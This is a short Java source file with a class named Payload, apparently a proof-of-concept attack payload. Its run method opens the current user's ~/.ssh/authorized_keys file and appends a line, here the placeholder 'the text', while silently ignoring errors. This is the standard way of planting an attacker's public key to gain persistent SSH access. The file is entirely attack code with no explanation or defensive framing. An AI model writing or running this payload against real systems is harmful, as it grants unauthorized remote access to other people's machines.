import java.io.*;

public class Payload {

    public static void main(String[] args) throws IOException {
        new Payload().run();
    }

    public void run() throws IOException {
        File authorizedKeys = new File(System.getProperty("user.home"), "/.ssh/authorized_keys");

        try(FileWriter fw = new FileWriter(authorizedKeys, true);
        BufferedWriter bw = new BufferedWriter(fw);
        PrintWriter out = new PrintWriter(bw))
        {
            out.println("the text");
        } catch (IOException e) {
        }
    }

}
